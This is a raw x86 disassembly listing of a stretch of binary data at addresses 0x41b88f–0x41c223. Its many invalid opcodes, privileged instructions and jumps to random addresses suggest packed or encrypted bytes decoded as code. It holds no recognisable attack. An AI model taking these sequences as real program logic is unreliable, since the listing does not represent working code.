  41b88f:	cmc    
  41b890:	test   eax,0xa06859d6
  41b895:	sti    
  41b896:	ds aam 0xf0
  41b899:	cmc    
  41b89a:	test   BYTE PTR [ebp+0x6c],al
  41b89d:	pop    esp
  41b89e:	shl    DWORD PTR [esi],1
  41b8a0:	test   BYTE PTR [edi-0x73a257e9],0xcf
  41b8a7:	xor    edi,edi
  41b8a9:	sub    esi,DWORD PTR [esi-0xe52484a]
  41b8af:	pop    esp
  41b8b0:	(bad)  
  41b8b1:	ins    BYTE PTR es:[edi],dx
  41b8b2:	and    eax,DWORD PTR [ebx]
  41b8b4:	push   0x13
  41b8b6:	xor    dh,bl
  41b8b8:	sbb    DWORD PTR [edx+0x6c],0x405e36b7
  41b8bf:	repnz fstp DWORD PTR [ecx+0x2bf9e4e6]
  41b8c6:	jae    0x41b84d
  41b8c8:	dec    ebx
  41b8c9:	jb     0x41b896
  41b8cb:	sti    
  41b8cc:	leave  
  41b8cd:	wbinvd 
  41b8cf:	mov    ds:0xc3aba6f1,eax
  41b8d4:	sbb    DWORD PTR [ebp-0x7944968d],eax
  41b8da:	inc    ecx
  41b8db:	repz inc ebp
  41b8dd:	jle    0x41b904
  41b8df:	aaa    
  41b8e0:	js     0x41b8e5
  41b8e2:	cmp    BYTE PTR [esi+0x23716d3],0xe0
  41b8e9:	pushf  
  41b8ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8eb:	dec    ecx
  41b8ec:	outs   dx,BYTE PTR ds:[esi]
  41b8ed:	lods   al,BYTE PTR ds:[esi]
  41b8ee:	jmp    0xe010540d
  41b8f3:	loop   0x41b8ae
  41b8f5:	xor    DWORD PTR [edx],0x9cd684b6
  41b8fb:	(bad)  
  41b8fc:	and    eax,0x1f1f02f4
  41b901:	cmc    
  41b902:	fnstenv [ebp+0xf7ad584]
  41b908:	mov    ah,0x95
  41b90a:	mov    bh,0x83
  41b90c:	push   edi
  41b90d:	push   edi
  41b90e:	imul   eax,DWORD PTR [ebx],0x18
  41b911:	popf   
  41b912:	sub    BYTE PTR [edx],cl
  41b914:	dec    ebp
  41b915:	leave  
  41b916:	pop    eax
  41b917:	nop
  41b918:	push   ebx
  41b919:	out    0xf7,al
  41b91b:	sbb    BYTE PTR [edx-0x2ac0dc69],dh
  41b921:	sbb    DWORD PTR [eax+0x30],esi
  41b924:	jle    0x41b8b2
  41b926:	fnstcw WORD PTR [esi+edx*8-0x27]
  41b92a:	push   ebx
  41b92b:	outs   dx,BYTE PTR ds:[esi]
  41b92c:	jae    0x41b92a
  41b92e:	push   0xffffff91
  41b930:	mov    gs,WORD PTR [ecx]
  41b932:	or     eax,0x2d94f143
  41b937:	popa   
  41b938:	cli    
  41b939:	popf   
  41b93a:	rcl    BYTE PTR [eax+0x41],1
  41b93d:	scas   al,BYTE PTR es:[edi]
  41b93e:	int3   
  41b93f:	cmp    dh,BYTE PTR [eax]
  41b941:	sub    eax,0x4a6385f4
  41b946:	xchg   edi,eax
  41b947:	stc    
  41b948:	cs jmp 0x4de7e739
  41b94e:	jecxz  0x41b98a
  41b950:	push   ebp
  41b951:	mov    ?,WORD PTR [ebx+0x6d]
  41b954:	jge    0x41b980
  41b956:	test   DWORD PTR [edi+0x3f8d4a8d],edi
  41b95c:	(bad)  
  41b95d:	in     al,dx
  41b95e:	pop    ds
  41b95f:	aas    
  41b960:	xor    al,BYTE PTR [ebx-0x1d]
  41b963:	ret    0xfa1f
  41b966:	mov    ebp,0x2ad47696
  41b96b:	mov    ch,0xc
  41b96d:	mov    edi,ebp
  41b96f:	not    ebx
  41b971:	xor    eax,0x798d2a81
  41b976:	loop   0x41b90a
  41b978:	(bad)  
  41b979:	xor    bh,BYTE PTR ss:[edx+0x2f26670f]
  41b980:	push   ecx
  41b981:	xlat   BYTE PTR ds:[ebx]
  41b982:	sbb    DWORD PTR [ebp-0x1e3b12e3],0x92eaec29
  41b98c:	cli    
  41b98d:	cmp    BYTE PTR [ebp-0x3],0x0
	...
  41b9f1:	add    BYTE PTR [eax],al
  41b9f3:	add    bl,al
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	dec    edi
  41ba01:	push   cs
  41ba02:	cwde   
  41ba03:	sbb    esp,DWORD PTR [eiz*1+0x1040001]
  41ba0a:	add    BYTE PTR [eax],al
  41ba0c:	dec    eax
  41ba0d:	push   ss
  41ba0e:	hlt    
  41ba0f:	or     BYTE PTR [ebp*1+0x4b62fb15],cl
  41ba16:	in     eax,0xbd
  41ba18:	cwde   
  41ba19:	xchg   BYTE PTR [edi-0x3c],dl
  41ba1c:	mov    ch,0x9b
  41ba1e:	push   esp
  41ba1f:	add    DWORD PTR [edx],ecx
  41ba21:	in     eax,0xe8
  41ba23:	stos   BYTE PTR es:[edi],al
  41ba24:	dec    ebp
  41ba25:	sti    
  41ba26:	xor    dh,BYTE PTR [edx]
  41ba28:	daa    
  41ba29:	scas   eax,DWORD PTR es:[edi]
  41ba2a:	adc    ebp,DWORD PTR [ebp+0x2f705b4]
  41ba30:	push   cs
  41ba31:	xchg   edx,eax
  41ba32:	rol    eax,1
  41ba34:	aaa    
  41ba35:	pop    ecx
  41ba36:	mov    fs,ebp
  41ba38:	xchg   dl,dh
  41ba3a:	nop
  41ba3b:	adc    eax,0x20b737dd
  41ba40:	adc    al,0x68
  41ba42:	sahf   
  41ba43:	add    al,0x49
  41ba45:	add    DWORD PTR [ebx+0x15],ebx
  41ba48:	pop    esp
  41ba49:	repz cmp DWORD PTR [eax+eax*8+0x7dfa3f0c],0x43
  41ba52:	ret    
  41ba53:	xor    bl,BYTE PTR [edi-0x36]
  41ba56:	cmp    DWORD PTR [ecx],0x1b
  41ba59:	sub    eax,0x5a5cf942
  41ba5e:	les    ebx,FWORD PTR [edx]
  41ba60:	jmp    0xc1d1578f
  41ba65:	sar    BYTE PTR [edi-0x6f087d78],cl
  41ba6b:	pop    ecx
  41ba6c:	cld    
  41ba6d:	jecxz  0x41ba07
  41ba6f:	pop    ecx
  41ba70:	fwait
  41ba71:	add    al,0x6f
  41ba73:	iret   
  41ba74:	dec    ebp
  41ba75:	idiv   DWORD PTR [ebp-0xe]
  41ba78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba79:	fwait
  41ba7a:	xor    ecx,edx
  41ba7c:	imul   ebx,DWORD PTR [edx+0x77],0x1e552266
  41ba83:	adc    edi,ecx
  41ba85:	dec    eax
  41ba86:	aam    0x4e
  41ba88:	jmp    0xf1c77f66
  41ba8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba8e:	jnp    0x41ba16
  41ba90:	pusha  
  41ba91:	mov    ?,ebp
  41ba93:	(bad)  
  41ba95:	loop   0x41ba85
  41ba97:	dec    edi
  41ba98:	push   esi
  41ba99:	sbb    dl,BYTE PTR [ebp+ebp*2-0x46a91ee7]
  41baa0:	or     dl,BYTE PTR [ebx]
  41baa2:	popa   
  41baa3:	push   esp
  41baa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41baa5:	mov    bl,BYTE PTR [esi]
  41baa7:	outs   dx,BYTE PTR ds:[esi]
  41baa8:	test   eax,0x2f50bef3
  41baad:	enter  0xd69,0x6b
  41bab1:	fnsave [esi*2+0x2f531076]
  41bab8:	cmp    ebp,DWORD PTR [edi+0x6c]
  41babb:	inc    edx
  41babc:	lods   al,BYTE PTR ds:[esi]
  41babd:	in     eax,dx
  41babe:	imul   BYTE PTR [edi+0x73]
  41bac1:	xor    dl,BYTE PTR [ecx-0x46]
  41bac4:	inc    edx
  41bac5:	cmp    al,0xd
  41bac7:	hlt    
  41bac8:	inc    eax
  41bac9:	in     al,dx
  41baca:	mov    ebx,0xd2926204
  41bacf:	pop    ebp
  41bad0:	mov    ch,0xe8
  41bad2:	mov    ds:0x71827e9,eax
  41bad7:	and    ch,0x65
  41bada:	inc    edi
  41badb:	ins    DWORD PTR es:[edi],dx
  41badc:	cmp    BYTE PTR [ebx-0x17],0xa8
  41bae0:	mov    ebp,0xe05fcc83
  41bae5:	and    al,0x8a
  41bae7:	xchg   esp,eax
  41bae8:	push   esp
  41bae9:	dec    eax
  41baea:	shl    BYTE PTR [esp+edx*2-0x23],cl
  41baee:	add    cl,BYTE PTR [edi-0x9b6ac35]
  41baf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41baf5:	jmp    0x41ba8f
  41baf7:	push   edx
  41baf8:	add    DWORD PTR [ecx+0x7e],edi
  41bafb:	cmp    DWORD PTR ds:0x1a31fc1d,esi
  41bb01:	nop
  41bb02:	jg     0x41bb44
  41bb04:	dec    edi
  41bb05:	jo     0x41ba8e
  41bb07:	or     DWORD PTR [ebx-0x4a14a2b9],ebx
  41bb0d:	or     al,0xa2
  41bb0f:	or     eax,DWORD PTR [eax]
	...
  41bb71:	add    BYTE PTR [eax],al
  41bb73:	add    BYTE PTR [edx],cl
  41bb75:	mov    eax,0xbfb7aaa5
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi+0x42],cx
  41bb81:	fmul   DWORD PTR [edi-0x31]
  41bb84:	sub    BYTE PTR [esi],ah
  41bb86:	add    DWORD PTR [eax],eax
  41bb88:	add    al,0x1
  41bb8a:	add    BYTE PTR [eax],al
  41bb8c:	or     DWORD PTR [esi],esp
  41bb8e:	or     eax,0x710d56ee
  41bb93:	push   eax
  41bb94:	pop    esp
  41bb95:	mov    BYTE PTR [ebx+0x4edd5b5d],ah
  41bb9b:	in     al,0x40
  41bb9d:	or     BYTE PTR [esi+0x7d],bh
  41bba0:	jecxz  0x41bbba
  41bba2:	mov    edi,0x33a0d25c
  41bba7:	sub    eax,0xaf67b850
  41bbac:	sub    eax,0xcd073050
  41bbb1:	(bad)  
  41bbb2:	out    dx,al
  41bbb3:	int    0x35
  41bbb5:	and    al,0x69
  41bbb7:	ja     0x41bb4b
  41bbb9:	sbb    ebp,DWORD PTR [ebp+0x5618a996]
  41bbbf:	mov    ds:0xa87a6263,eax
  41bbc4:	in     al,0xe6
  41bbc6:	ret    
  41bbc7:	xor    DWORD PTR [esi+0x35],0x0
  41bbcb:	mov    ebp,0xc94523e7
  41bbd0:	and    eax,0x6d51abe4
  41bbd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbd6:	mov    esi,0x203805f
  41bbdb:	sbb    ah,BYTE PTR [ebp+0x22502181]
  41bbe1:	sub    BYTE PTR [edx-0x27e1888a],dh
  41bbe7:	rcr    ah,0x2
  41bbea:	jg     0x41bbdb
  41bbec:	int    0x8e
  41bbee:	sahf   
  41bbef:	xchg   edx,eax
  41bbf0:	push   0xfffffffc
  41bbf2:	push   ds
  41bbf3:	push   ebx
  41bbf4:	les    ebx,FWORD PTR ds:0x61c22766
  41bbfa:	push   es
  41bbfb:	sub    ecx,DWORD PTR [ebp-0x27]
  41bbfe:	pop    es
  41bbff:	sub    al,0x9c
  41bc01:	out    dx,eax
  41bc02:	imul   ecx,DWORD PTR [ebp+0x4c06b3d5],0x10a45419
  41bc0c:	pop    ds
  41bc0d:	pusha  
  41bc0e:	call   0x54a9bc84
  41bc13:	cmp    al,0xc7
  41bc15:	cmp    cl,ah
  41bc17:	push   esi
  41bc18:	pop    ecx
  41bc19:	lods   eax,DWORD PTR ds:[esi]
  41bc1a:	and    eax,0xb20aa10a
  41bc1f:	push   0x7db23e97
  41bc24:	cmp    eax,0xc67f821
  41bc29:	mov    ds:0xbdd24531,eax
  41bc2e:	aam    0xdc
  41bc30:	pop    eax
  41bc31:	(bad)  
  41bc32:	imul   edi,DWORD PTR [eax+0x77681117],0xffffffcc
  41bc39:	cwde   
  41bc3a:	sti    
  41bc3b:	sub    al,0x3c
  41bc3d:	into   
  41bc3e:	aaa    
  41bc3f:	fs push ebx
  41bc41:	jbe    0x41bc38
  41bc43:	jo     0x41bcbe
  41bc45:	pusha  
  41bc46:	les    ecx,FWORD PTR [eax-0x47]
  41bc49:	int    0x92
  41bc4b:	mov    DWORD PTR [ecx],esi
  41bc4d:	pusha  
  41bc4e:	int3   
  41bc4f:	push   cs
  41bc50:	adc    cl,BYTE PTR [eax+ebp*8]
  41bc53:	loope  0x41bbfa
  41bc55:	adc    esp,DWORD PTR [ecx+0x47]
  41bc58:	push   0x6023e9a8
  41bc5d:	sub    esi,DWORD PTR [ecx-0x46]
  41bc60:	cli    
  41bc61:	popa   
  41bc62:	call   0xabf0:0xa815874c
  41bc69:	retf   
  41bc6a:	in     eax,dx
  41bc6b:	stc    
  41bc6c:	call   FWORD PTR [eax-0x4cb493e4]
  41bc72:	sbb    al,0xd3
  41bc74:	add    edi,DWORD PTR ds:0xc3140f3e
  41bc7a:	mov    al,BYTE PTR [eax+0xe]
  41bc7d:	pop    ds
  41bc7e:	lock fnstsw WORD PTR [ecx+0x5b]
  41bc82:	mov    ah,0xd1
  41bc84:	pop    edi
  41bc85:	add    cl,0xfb
  41bc88:	inc    ecx
  41bc89:	pop    edi
  41bc8a:	xchg   BYTE PTR [eax-0x42023824],ch
	...
  41bcf4:	shl    BYTE PTR [edx],cl
  41bcf6:	cli    
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0xb22cd9d8
  41bd02:	pop    es
  41bd03:	push   ebp
  41bd04:	sub    al,0x27
  41bd06:	add    DWORD PTR [eax],eax
  41bd08:	add    al,0x1
  41bd0a:	add    BYTE PTR [eax],al
  41bd0c:	push   ecx
  41bd0d:	or     DWORD PTR [ebx+ecx*4],ecx
  41bd10:	mov    ebp,DWORD PTR [edi-0x10]
  41bd13:	mov    edx,0x92e1322c
  41bd18:	sub    eax,0x62d8adac
  41bd1d:	mov    edx,0x8c13cd11
  41bd22:	xadd   DWORD PTR [edi+edx*4],edx
  41bd26:	or     al,0x76
  41bd28:	mov    ah,0xb8
  41bd2a:	fiadd  WORD PTR [esp+edx*8]
  41bd2d:	aad    0x3f
  41bd2f:	push   esi
  41bd30:	sbb    eax,0xacbe36de
  41bd35:	shl    DWORD PTR [edi+0x5ecca9f2],1
  41bd3b:	outs   dx,DWORD PTR ds:[esi]
  41bd3c:	jb     0x41bd44
  41bd3e:	into   
  41bd3f:	(bad)  
  41bd40:	lods   eax,DWORD PTR ds:[esi]
  41bd41:	add    BYTE PTR [ebx+edx*2],dl
  41bd44:	sub    dl,cl
  41bd46:	adc    dl,BYTE PTR [edi-0x3d]
  41bd49:	and    eax,edi
  41bd4b:	or     ecx,DWORD PTR [ebp+0x3d]
  41bd4e:	and    ebp,DWORD PTR [eax-0xa]
  41bd51:	dec    BYTE PTR [esi]
  41bd53:	enter  0x5845,0xdd
  41bd57:	hlt    
  41bd58:	popa   
  41bd59:	inc    edi
  41bd5a:	imul   eax,DWORD PTR [esi-0x38a07717],0xfffffffb
  41bd61:	mov    ds:0x198a380c,al
  41bd66:	fwait
  41bd67:	push   edi
  41bd68:	lock add DWORD PTR [ecx],ebx
  41bd6b:	mov    dl,0xf7
  41bd6d:	inc    eax
  41bd6e:	inc    ebp
  41bd6f:	cmp    BYTE PTR [edi-0x60],0x52
  41bd73:	xchg   BYTE PTR [edi],bl
  41bd75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd76:	shr    DWORD PTR [ebx+eax*1+0x32],0x5d
  41bd7b:	test   ch,al
  41bd7d:	sub    eax,0x1eb1c2a6
  41bd82:	out    0xb1,al
  41bd84:	ficom  WORD PTR [esi]
  41bd86:	sub    edi,DWORD PTR [ebx-0x70514e0c]
  41bd8c:	sbb    ch,BYTE PTR [edx+edx*1-0x4ee979ce]
  41bd93:	push   es
  41bd94:	jmp    0x3b24d4dc
  41bd99:	sahf   
  41bd9a:	cmc    
  41bd9b:	xor    bl,BYTE PTR [ebx]
  41bd9d:	icebp  
  41bd9e:	lods   eax,DWORD PTR ds:[esi]
  41bd9f:	mov    edx,0x63c0bcac
  41bda4:	inc    ebp
  41bda5:	clc    
  41bda6:	test   al,0xce
  41bda8:	sar    DWORD PTR [eax-0x7c80d8f6],0x69
  41bdaf:	into   
  41bdb0:	rcr    bh,0x99
  41bdb3:	imul   esi,DWORD PTR es:[ecx-0x643c929a],0xffffffd6
  41bdbb:	cwde   
  41bdbc:	or     BYTE PTR [ecx-0x72eaca9c],dh
  41bdc2:	jne    0x41bdc3
  41bdc4:	lods   al,BYTE PTR ds:[esi]
  41bdc5:	mov    al,0x35
  41bdc7:	pop    eax
  41bdc8:	push   es
  41bdc9:	add    ah,BYTE PTR [edi]
  41bdcb:	mov    esi,DWORD PTR [edx]
  41bdcd:	idiv   DWORD PTR [edx-0x7f0001e2]
  41bdd3:	shl    ebp,cl
  41bdd5:	mov    WORD PTR [eax+0x275b716d],ds
  41bddb:	in     al,dx
  41bddc:	clc    
  41bddd:	mov    WORD PTR [ebx+0x422d66e0],cs
  41bde3:	minps  xmm2,xmm4
  41bde6:	inc    edi
  41bde7:	add    ecx,eax
  41bde9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdea:	dec    ebp
  41bdeb:	xchg   BYTE PTR [edx-0x3],al
  41bdee:	fld    QWORD PTR [ebx+0x6b]
  41bdf1:	popf   
  41bdf2:	sub    BYTE PTR [ecx],bl
  41bdf4:	mov    es,WORD PTR [ebx]
  41bdf6:	aam    0xbf
  41bdf8:	into   
  41bdf9:	test   BYTE PTR [edi+0x37abe5ba],dh
  41bdff:	xor    eax,0x92bf21b
  41be04:	nop
  41be05:	sahf   
  41be06:	dec    esi
  41be07:	in     al,0x5e
  41be09:	and    ah,BYTE PTR [esi+0x8]
  41be0c:	test   al,0xb7
  41be0e:	mov    bh,0xf5
	...
  41be74:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41be7a:	imul   edi
  41be7c:	mov    ebp,DWORD PTR [ecx+0x623a3f66]
  41be82:	pop    esi
  41be83:	pop    ecx
  41be84:	xor    BYTE PTR [eax],ch
  41be86:	add    DWORD PTR [eax],eax
  41be88:	add    al,0x1
  41be8a:	add    BYTE PTR [eax],al
  41be8c:	push   edi
  41be8d:	test   eax,0xb35db352
  41be92:	inc    esp
  41be93:	rcl    esp,1
  41be95:	push   cs
  41be96:	sub    al,0x3c
  41be98:	out    0xba,al
  41be9a:	inc    edi
  41be9b:	xor    bh,BYTE PTR [edi-0x48750a77]
  41bea1:	rep ins DWORD PTR es:[edi],dx
  41bea3:	mov    bl,0x8b
  41bea5:	and    ebx,DWORD PTR [ebx]
  41bea7:	xor    al,0x0
  41bea9:	jmp    0xf8de24d5
  41beae:	repnz mov eax,0x86bba24
  41beb4:	adc    esp,DWORD PTR [edi+0x54]
  41beb7:	hlt    
  41beb8:	push   ds
  41beb9:	dec    ebp
  41beba:	ds daa 
  41bebc:	push   edi
  41bebd:	pop    ds
  41bebe:	jp     0x41be81
  41bec0:	mov    ebx,0x2ae4a356
  41bec5:	in     eax,dx
  41bec6:	in     eax,dx
  41bec7:	aas    
  41bec8:	call   0x9b8325a
  41becd:	and    eax,0xff53e93f
  41bed2:	jnp    0x41beed
  41bed4:	add    esp,DWORD PTR [eax]
  41bed6:	push   ecx
  41bed7:	adc    al,0xe0
  41bed9:	xor    dl,BYTE PTR [esi]
  41bedb:	repz push ss
  41bedd:	mov    DWORD PTR [ebp+0x4],ecx
  41bee0:	addr16 daa 
  41bee2:	std    
  41bee3:	call   0x699a:0x404d4bab
  41beea:	jl     0x41bebf
  41beec:	jo     0x41bef3
  41beee:	mov    edx,0x403a3196
  41bef3:	int3   
  41bef4:	ror    DWORD PTR [ebx],1
  41bef6:	cdq    
  41bef7:	or     DWORD PTR [eax+0x32956c1b],edi
  41befd:	(bad)  
  41befe:	stos   DWORD PTR es:[edi],eax
  41beff:	les    esp,FWORD PTR [edi]
  41bf01:	sahf   
  41bf02:	add    bh,0x72
  41bf05:	jns    0x41bedd
  41bf07:	mov    eax,0xdaa80438
  41bf0c:	add    ecx,DWORD PTR [edi]
  41bf0e:	cmp    DWORD PTR [edx+ebp*1],0xffffff8e
  41bf12:	fstp   TBYTE PTR [eax]
  41bf14:	push   ss
  41bf15:	add    dl,BYTE PTR [eax]
  41bf17:	jae    0x41bf33
  41bf19:	aas    
  41bf1a:	nop
  41bf1b:	rcl    BYTE PTR [ebp+0x698bf473],1
  41bf21:	mov    ch,0xe0
  41bf23:	cmp    ebx,0xffffff8f
  41bf26:	jmp    0x73a75dc8
  41bf2b:	sbb    ecx,esi
  41bf2d:	xchg   esi,eax
  41bf2e:	xchg   esi,eax
  41bf2f:	xchg   ecx,eax
  41bf30:	leave  
  41bf31:	fcom   QWORD PTR [ebp-0x54225e00]
  41bf37:	jno    0x41bed4
  41bf39:	mov    cl,0x35
  41bf3b:	dec    ebx
  41bf3c:	dec    edi
  41bf3d:	adc    eax,0x9942be26
  41bf42:	or     ecx,DWORD PTR [edi+eax*2]
  41bf45:	imul   esp,ebp,0xffffffdb
  41bf48:	pop    ebp
  41bf49:	sbb    eax,edi
  41bf4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf4c:	xor    BYTE PTR [ebx+0x5a2746ab],dh
  41bf52:	outs   dx,BYTE PTR ds:[esi]
  41bf53:	(bad)  [edx]
  41bf55:	pop    eax
  41bf56:	lahf   
  41bf57:	jecxz  0x41bee5
  41bf59:	pop    edx
  41bf5a:	xchg   esp,eax
  41bf5b:	rol    esi,0x32
  41bf5e:	paddusw mm2,QWORD PTR [edx+0x13]
  41bf62:	pop    esi
  41bf63:	jg     0x41befe
  41bf65:	jae    0x41bf95
  41bf67:	stos   DWORD PTR es:[edi],eax
  41bf68:	(bad)  
  41bf69:	int    0xef
  41bf6b:	pop    esi
  41bf6c:	pop    esp
  41bf6d:	mov    DWORD PTR [ebx-0x3e],ebp
  41bf70:	fild   QWORD PTR [edi-0x73]
  41bf73:	scas   al,BYTE PTR es:[edi]
  41bf74:	or     BYTE PTR [edi+0x430b27c3],0x6b
  41bf7b:	lea    edi,[edx]
  41bf7d:	and    DWORD PTR [bx+si-0x77],eax
  41bf81:	push   eax
  41bf82:	in     eax,0x76
  41bf84:	add    eax,0x15023790
  41bf89:	mov    bl,0x81
  41bf8b:	mov    cl,0x6
  41bf8d:	adc    BYTE PTR [edi+0x26],dh
	...
  41bff3:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	pop    es
  41c001:	and    eax,0x29349e40
  41c006:	add    DWORD PTR [eax],eax
  41c008:	add    al,0x1
  41c00a:	add    BYTE PTR [eax],al
  41c00c:	lea    ebx,[eax-0x41900e99]
  41c012:	outs   dx,BYTE PTR ds:[esi]
  41c013:	xchg   ebx,eax
  41c014:	pop    ss
  41c015:	jbe    0x41bf99
  41c017:	mov    edi,ebx
  41c019:	leave  
  41c01a:	(bad)  
  41c01b:	sti    
  41c01c:	fld    DWORD PTR ds:0xa3e9f928
  41c022:	sbb    ch,BYTE PTR [edx]
  41c024:	cld    
  41c025:	jecxz  0x41c01b
  41c027:	outs   dx,DWORD PTR ds:[esi]
  41c028:	test   ebp,esi
  41c02a:	sub    DWORD PTR [edi],esp
  41c02c:	(bad)  
  41c02d:	dec    ebp
  41c02e:	pop    eax
  41c02f:	push   eax
  41c030:	lea    esp,[edi]
  41c032:	jb     0x41c087
  41c034:	xor    eax,0xe80025d7
  41c039:	and    DWORD PTR [ebx+eiz*4+0x57],esp
  41c03d:	(bad)  
  41c03e:	je     0x41bffc
  41c040:	add    esp,edx
  41c042:	pop    ebx
  41c043:	enter  0x41f,0x8
  41c047:	daa    
  41c048:	mov    al,0x41
  41c04a:	add    bh,ah
  41c04c:	xchg   ecx,eax
  41c04d:	pop    ebp
  41c04e:	xchg   esi,eax
  41c04f:	cld    
  41c050:	add    ebx,DWORD PTR [eax]
  41c052:	(bad)  
  41c053:	repnz cli 
  41c055:	and    ecx,eax
  41c057:	xor    al,0x28
  41c059:	mov    DWORD PTR [ecx-0x49f9b9b0],esi
  41c05f:	jae    0x41bfe1
  41c061:	imul   DWORD PTR [edx+0x419c400c]
  41c067:	fstp   DWORD PTR [eax+0x6fb5e84a]
  41c06d:	ds jmp 0x41c037
  41c070:	push   ss
  41c071:	rcl    BYTE PTR [edi],cl
  41c073:	xchg   edi,eax
  41c074:	mov    esp,0x26ecca35
  41c079:	push   edx
  41c07a:	stc    
  41c07b:	jb     0x41c070
  41c07d:	fild   QWORD PTR [esi-0x57bc23b3]
  41c083:	and    dh,ah
  41c085:	lahf   
  41c086:	nop
  41c087:	outs   dx,BYTE PTR ds:[esi]
  41c088:	(bad)  
  41c089:	and    dl,BYTE PTR [ecx-0x3c]
  41c08c:	xor    al,0x80
  41c08e:	les    esp,FWORD PTR [esi]
  41c090:	(bad)  
  41c091:	mov    BYTE PTR [ebx-0x2d15431a],dl
  41c097:	xchg   edx,eax
  41c098:	shl    DWORD PTR [ecx+0x7a],0xe6
  41c09c:	out    dx,al
  41c09d:	and    dh,BYTE PTR [esi]
  41c09f:	mov    eax,ds:0x724e715e
  41c0a4:	xchg   BYTE PTR [ebx],bl
  41c0a6:	and    eax,0x5069448c
  41c0ab:	adc    ch,BYTE PTR [esi-0x65]
  41c0ae:	test   BYTE PTR [ebp-0x5d7a3c63],bl
  41c0b4:	mov    BYTE PTR [edx-0x68],dh
  41c0b7:	and    BYTE PTR [ebx+0x2d065e58],0x17
  41c0be:	nop
  41c0bf:	and    eax,0x7e4ef4b3
  41c0c4:	cld    
  41c0c5:	and    esi,DWORD PTR [ebx+edi*8+0x54e94de9]
  41c0cc:	xchg   edx,eax
  41c0cd:	mov    ebx,0x1aac13b1
  41c0d2:	out    dx,eax
  41c0d3:	or     dl,BYTE PTR [ebx]
  41c0d5:	(bad)  
  41c0d6:	push   0x17bf5e8c
  41c0db:	cwde   
  41c0dc:	test   al,0xbf
  41c0de:	mov    bh,bh
  41c0e0:	pusha  
  41c0e1:	adc    esi,0x22
  41c0e4:	xchg   BYTE PTR [ebx+0x18],ch
  41c0e7:	push   edi
  41c0e8:	lods   eax,DWORD PTR ds:[esi]
  41c0e9:	adc    edi,DWORD PTR cs:[ebp+0x53]
  41c0ed:	xor    ecx,DWORD PTR [ecx-0x1a38d464]
  41c0f3:	inc    ecx
  41c0f4:	aas    
  41c0f5:	out    0xbb,al
  41c0f7:	sbb    BYTE PTR [eax-0x40],dh
  41c0fa:	out    0x7c,al
  41c0fc:	sbb    DWORD PTR ds:[edx+0x47087b63],esp
  41c103:	adc    ebx,DWORD PTR [ebp-0x2b08d4f5]
  41c109:	jno    0x41c0e2
  41c10b:	xor    eax,0xd009d6f0
	...
  41c174:	(bad)  [edx-0x5f]
  41c177:	clc    
  41c178:	mov    bl,0xfb
  41c17a:	fldcw  WORD PTR [ebx+0x3d]
  41c17d:	add    DWORD PTR ds:0xdcc379e9,eax
  41c183:	mov    eax,0x12a38
  41c188:	add    al,0x1
  41c18a:	add    BYTE PTR [eax],al
  41c18c:	sar    DWORD PTR [edx],cl
  41c18e:	aam    0x58
  41c190:	ja     0x41c16e
  41c192:	leave  
  41c193:	jb     0x41c138
  41c195:	daa    
  41c196:	int    0xc5
  41c198:	and    DWORD PTR [edx],edx
  41c19a:	cld    
  41c19b:	adc    al,0xcf
  41c19d:	sub    ecx,DWORD PTR [edi]
  41c19f:	out    0x7d,eax
  41c1a1:	dec    ecx
  41c1a2:	jg     0x41c1b0
  41c1a4:	in     al,dx
  41c1a5:	inc    eax
  41c1a6:	das    
  41c1a7:	jne    0x41c1db
  41c1a9:	sub    bl,BYTE PTR [ebx+edx*1]
  41c1ac:	push   ds
  41c1ad:	push   edx
  41c1ae:	adc    BYTE PTR [edi+esi*4],ah
  41c1b1:	push   edi
  41c1b2:	fisttp WORD PTR [ebx+0x7f]
  41c1b5:	xor    edx,DWORD PTR [esi+0x5d1a6c4c]
  41c1bb:	retf   0xc4ee
  41c1be:	imul   edx,DWORD PTR [edx+0x3ca767db],0xffffffcc
  41c1c5:	fnsave [edi+0x58]
  41c1c8:	push   ebp
  41c1c9:	and    BYTE PTR [eax+0x147aecda],bh
  41c1cf:	popa   
  41c1d0:	loopne 0x41c164
  41c1d2:	shl    BYTE PTR [esp+ebx*1+0x3e2d197c],0x8
  41c1da:	fcom   QWORD PTR [ebx-0x65627b8]
  41c1e0:	fisub  DWORD PTR [ecx]
  41c1e2:	xor    DWORD PTR [edx+0x4f],ecx
  41c1e5:	shr    BYTE PTR [edi],cl
  41c1e7:	mov    al,ds:0x91636387
  41c1ec:	pushf  
  41c1ed:	into   
  41c1ee:	adc    al,0x90
  41c1f0:	and    DWORD PTR [ebp+0x3b],ebx
  41c1f3:	aam    0xaa
  41c1f5:	mov    ah,0x58
  41c1f7:	inc    ecx
  41c1f8:	pushf  
  41c1f9:	cmc    
  41c1fa:	mov    cl,BYTE PTR [edi*1-0x6c105fb6]
  41c201:	imul   esi,DWORD PTR [ebx],0x66
  41c204:	jns    0x41c19c
  41c206:	je     0x41c267
  41c208:	push   ebx
  41c209:	mov    ecx,0x7f594b6b
  41c20e:	fcom   DWORD PTR [esi-0x53]
  41c211:	jb     0x41c1b8
  41c213:	scas   eax,DWORD PTR es:[edi]
  41c214:	arpl   WORD PTR [eax+0x24],si
  41c217:	sub    eax,DWORD PTR [ebx]
  41c219:	xchg   cl,ch
  41c21b:	in     al,0x2b
  41c21d:	not    DWORD PTR ds:0xb6b9d371
  41c223:	stos   DWORD PTR es:[edi],eax
